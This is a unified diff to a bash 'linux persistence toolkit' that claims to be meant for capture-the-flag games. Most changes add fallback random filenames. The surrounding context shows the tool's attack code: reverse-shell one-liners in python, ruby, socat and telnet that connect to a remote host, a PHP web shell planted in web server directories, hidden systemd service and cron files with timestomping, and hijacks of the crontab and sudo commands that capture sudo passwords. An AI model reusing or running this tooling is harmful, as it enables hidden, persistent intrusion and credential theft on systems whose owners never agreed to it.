@@ -13,13 +13,13 @@ LIMIT=0
 STEALTHMODE=0
 TIMESTOMP=0
 REMOVALTOOL=$(which srm) || REMOVALTOOL=$(which rm)
-RANDOMPHPFILE=$(echo $(uuidgen).php)
-RANDOMCRONFILE=$(echo $(uuidgen))
+RANDOMPHPFILE=$(echo $(uuidgen 2> /dev/null).php) || RANDOMPHPFILE=$(echo $(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n').php)
+RANDOMCRONFILE=$(echo $(uuidgen 2> /dev/null)) || RANDOMCRONFILE=$(echo $(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
 RANDOMPORT=$(expr 1024 + $RANDOM)
 SHELL="/bin/bash"
-SERVICEFILE=$(echo $(uuidgen).service)
-SERVICESHELLSCRIPT=$(echo $(uuidgen).sh)
-CRONDFILE=$(echo $(uuidgen | tr -d '-'))
+SERVICEFILE=$(echo $(uuidgen 2> /dev/null).service) || SERVICEFILE=$(echo $(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n').service)
+SERVICESHELLSCRIPT=$(echo $(uuidgen 2> /dev/null).sh) || SERVICESHELLSCRIPT=$(echo $(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n').sh)
+CRONDFILE=$(echo $(uuidgen 2> /dev/null | tr -d '-')) || CRONDFILE=$(echo $(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
 
 INFO="linux persistence toolkit\n\nadvisory: this was developed with ctfs in mind and that is its intended use case. please do not use this tool in an unethical or illegal manner.\n"
 
@@ -162,9 +162,9 @@ stealth_modifications() {
 
     DISABLEBASHRC=1
     TIMESTOMP=1
-    SERVICEFILE=$(echo /etc/systemd/system/.$(uuidgen).service)
-    SERVICESHELLSCRIPT=$(echo /etc/systemd/system/.$(uuidgen))
-    CRONDFILE=.$(echo $(uuidgen | tr -d '-'))
+    SERVICEFILE=$(echo /etc/systemd/system/.$(uuidgen 2> /dev/null).service) || SERVICEFILE=$(echo /etc/systemd/system/.$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n').service)
+    SERVICESHELLSCRIPT=$(echo /etc/systemd/system/.$(uuidgen 2> /dev/null)) || SERVICESHELLSCRIPT=$(echo /etc/systemd/system/.$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
+    CRONDFILE=.$(echo $(uuidgen 2> /dev/null | tr -d '-')) || CRONDFILE=.$(echo $(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
 
     echo 'function crontab () { #linpercrontab
     REALBIN="$(which crontab)" #linpercrontab
@@ -205,21 +205,21 @@ find_writable() {
 	export WRITABLE_DIR=$(find $WRITABLE_DIR -type d -writable 2> /dev/null | head -n 1)
     fi
 
-    TMPTEST=$WRITABLE_DIR/$(uuidgen)
+    TMPTEST=$WRITABLE_DIR/$(uuidgen 2> /dev/null) || TMPTEST=$WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n')
 
     (touch $TMPTEST && $REMOVALTOOL $TMPTEST) 2> /dev/null || (echo -e "\e[91m[-]\e[0m Error: Could not find a writable directory for temporary files" && echo -e "\e[93m[!]\e[0m Action: You can force one with -w, --writable-dir" && echo -e "\e[91m[-]\e[0m Killing Process" && kill -9 $$)
 
     echo -e "\e[92m[+]\e[0m Choosing $WRITABLE_DIR"
     echo "-----------------------"
-    export TMPCRON=$(echo $WRITABLE_DIR/$(uuidgen))
-    export TMPCRONWITHPAYLOAD=$(echo $WRITABLE_DIR/$(uuidgen))
-    export TMPJJSFILE=$(echo $WRITABLE_DIR/$(uuidgen))
-    export SUDOPASSWORDFILE=$(echo $WRITABLE_DIR/$(uuidgen))
-    export TMPRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen))
-    export TMPGOFILE=$(echo $WRITABLE_DIR/$(uuidgen).go)
-    export PIPDIR=$(echo $WRITABLE_DIR/$(uuidgen))
-    export PIP3DIR=$(echo $WRITABLE_DIR/$(uuidgen))
-    export EASYINSTALLDIR=$(echo $WRITABLE_DIR/$(uuidgen))
+    export TMPCRON=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null)) || TMPCRON=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
+    export TMPCRONWITHPAYLOAD=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null)) || TMPCRONWITHPAYLOAD=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
+    export TMPJJSFILE=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null)) || TMPJJSFILE=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
+    export SUDOPASSWORDFILE=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null)) || SUDOPASSWORDFILE=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
+    export TMPRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null)) || TMPRCLOCAL=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
+    export TMPGOFILE=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null).go) || TMPGOFILE=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
+    export PIPDIR=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null)) || PIPDIR=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
+    export PIP3DIR=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null)) || PIP3DIR=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
+    export EASYINSTALLDIR=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null)) || EASYINSTALLDIR=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
 
 }
 
@@ -267,7 +267,7 @@ set_methods(){
     "python3.8 , python3.8 -c 'import socket,subprocess,os;exit()' , python3.8 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
     "ruby , ruby -rsocket -e 'exit' , ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\\\"'$RHOST'\\\",'$RPORT');while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end'?"
     "socat , socat tcp-listen:$RANDOMPORT STDOUT & echo exit | socat -t 1 STDIN tcp-connect:0.0.0.0:$RANDOMPORT , socat tcp-connect:$RHOST:$RPORT exec:$SHELL,pty,stderr,setsid,sigint,sane?"
-    "telnet , echo quit | telnet , TELNETNAMEDPIPE=\\\$(echo $WRITABLE_DIR/$(uuidgen);mkfifo \\\$TELNETNAMEDPIPE && telnet $RHOST $RPORT 2> /dev/null 0<\\\$TELNETNAMEDPIPE | $SHELL 1>\\\$TELNETNAMEDPIPE 2> /dev/null & sleep .0001 #?"
+    "telnet , echo quit | telnet , TELNETNAMEDPIPE=\\\$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null || grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n');mkfifo \\\$TELNETNAMEDPIPE && telnet $RHOST $RPORT 2> /dev/null 0<\\\$TELNETNAMEDPIPE | $SHELL 1>\\\$TELNETNAMEDPIPE 2> /dev/null & sleep .0001 #?"
 )
 
 }
@@ -385,10 +385,10 @@ webserver_poison_attack() {
 			if $(echo $METHOD | grep -qi "php");
 			then	
 			    unset IFS
-			    RANDOMPHPFILE=$(echo $(uuidgen).php)
+			    RANDOMPHPFILE=$(echo $(uuidgen 2> /dev/null).php) || RANDOMPHPFILE=$(echo $(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n').php)
 			    if [ "$STEALTHMODE" -eq 1 ];
 			    then
-				RANDOMPHPFILE=$(echo .$(uuidgen).php)
+				    RANDOMPHPFILE=$(echo .$(uuidgen 2> /dev/null).php) || RANDOMPHPFILE=$(echo .$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
 			    fi
 			    PAYLOAD="<?php exec(\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\"); ?>"
 			    echo $PAYLOAD > $i/$RANDOMPHPFILE && 
@@ -416,13 +416,6 @@ sudo_hijack_attack() {
 
     if $(cat /etc/group | grep sudo | grep -qi $(whoami)) && $(which curl | grep -qi curl);
     then
-	TMPSUDOFILE=$(echo $WRITABLE_DIR/$(uuidgen))
-	timeout 1 sudo -l > $TMPSUDOFILE
-	if cat $TMPSUDOFILE | grep ALL | grep -q NOPASSWD;
-	then
-	    $REMOVALTOOL $TMPSUDOFILE
-	    return
-	fi
 	if [ "$DRYRUN" -eq 0 ];
 	then
 	    echo 'function sudo () { #linpersudo
@@ -465,9 +458,9 @@ shadow() {
 
 cleanup() {
 
-    TMPCLEANBASHRC=$(echo $WRITABLE_DIR/$(uuidgen))
-    TMPCLEANRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen))
-    TMPCLEANCRONTAB=$(echo $WRITABLE_DIR/$(uuidgen))
+	TMPCLEANBASHRC=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null)) || TMPCLEANBASHRC=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
+	TMPCLEANRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null)) || TMPCLEANRCLOCAL=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
+	TMPCLEANCRONTAB=$(echo $WRITABLE_DIR/$(uuidgen 2> /dev/null)) || TMPCLEANCRONTAB=$(echo $WRITABLE_DIR/$(grep -oa --color=never [qwertyuiooplkjhgfdsazxcvbnm1234567890] /dev/urandom | head -n 20 | tr -d '\n'))
 
     if $(echo $RHOST | grep -qP "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$");
     then
